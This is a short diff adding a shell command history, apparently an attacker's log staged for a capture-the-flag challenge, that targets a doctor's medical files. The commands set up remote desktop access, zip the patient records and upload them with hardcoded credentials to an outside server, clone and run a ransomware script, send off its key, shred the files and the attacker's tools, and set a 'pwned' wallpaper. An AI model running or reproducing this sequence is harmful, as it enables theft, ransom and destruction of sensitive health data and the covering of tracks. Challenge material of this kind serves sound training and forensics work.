@@ -1,0 +1,28 @@
+apt install xrdp
+systemctl enable --now xrdp
+echo $PWD
+cd /home/drgarcia
+cd medical-files/
+ls
+cd x-ray/
+ls -la
+cd ..
+cd precursor-lesions/
+ls -la
+cd ../../
+zip -r -s 400m files.zip medical-files/
+curl -s -c cookies.txt -d "user=louden&password=M4st4rH4ck3r567!" "http://challs.caliphallabs.com:18971/login"
+for part in files.z* files.zip; do curl -b cookies.txt -X POST -F "file=@$part" "http://challs.caliphallabs.com:18971/upload/Hospital"; done
+git clone http://challs.caliphallabs.com:34698/louden/ransomware-hospital
+mv ransomware-hospital/* ..
+python --version
+pip install -r requirements.txt
+python3 ransom.py
+cat key.txt
+curl -b cookies.txt -X POST -F "file=@key.txt" "http://challs.caliphallabs.com:18971/upload/Hospital"
+find medical-files/ -type f -exec shred -u {} \;
+find assets/ -type f -exec shred -u {} \;
+find src/ -type f -exec shred -u {} \;
+rm -rf medical-files/ ransomware-hospital/ assets/ src/
+shred -u files.z* files.zip cookies.txt key.txt ransom.py README.md requirements.txt
+xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s /home/drgarcia/pwned.png
